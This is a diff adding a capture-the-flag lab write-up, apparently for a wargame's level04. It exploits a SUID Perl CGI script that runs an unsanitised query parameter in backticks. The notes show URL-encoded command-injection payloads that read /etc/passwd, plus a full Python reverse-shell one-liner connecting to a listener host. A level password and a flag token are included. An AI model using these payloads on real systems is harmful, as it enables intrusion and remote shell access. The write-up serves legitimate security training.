@@ -1,0 +1,44 @@
+login/pw:
+	level04 : qi0maab88jeaj46qoumi7maus
+
+user info:
+	ls -la
+		=> -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+			=> SUID flag04
+				perl file
+					# localhost:4747
+					use CGI qw{param};
+
+RESOLUTION:
+	ls -l /var/www
+		=> dr-xr-x---+ 2 flag04 level04  60 Oct 20 09:49 level04
+	ls -l /var/www/level04
+		=> -r-xr-x---+ 1 flag04 level04 152 Oct 20 09:49 level04.pl	
+		=> '+' sign => Extended permissions
+		getfacl /var/www/level04/level04.pl
+			=> group:www-data:r-x
+	cat /var/www/level04/level04.pl
+		=> Subroutine x
+		=> Take first param
+		=> Doesnt sanitize input
+		=> Use it in shell command (backticks)
+		=> Call subroutine x passing it query string param x
+	http://[IP]:4747?x=abc
+		=> print "abc"
+	http://[IP]:4747?x=&&
+		=> Nothing displayed, obviously we need to encode the url
+	http://[IP]:4747?x=%26%26cat /etc/passwd
+		=> We get the file
+		=> We could just use getflag, but there is no fun
+	Reverse Shell:
+		host:
+			ifconfig
+				=> ip = 192.168.1.61
+			nc -lvp 1234	
+		https://www.urlencoder.org/
+			=> python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.1.61",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")'
+		remote:
+			http://[IP]:4747?x=%26%26python%20-c%20%27a%3D__import__%3Bs%3Da%28%22socket%22%29.socket%3Bo%3Da%28%22os%22%29.dup2%3Bp%3Da%28%22pty%22%29.spawn%3Bc%3Ds%28%29%3Bc.connect%28%28%22192.168.1.61%22%2C1234%29%29%3Bf%3Dc.fileno%3Bo%28f%28%29%2C0%29%3Bo%28f%28%29%2C1%29%3Bo%28f%28%29%2C2%29%3Bp%28%22%2Fbin%2Fbash%22%29%27
+		We get a reverse shell		
+	getflag:
+		=> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
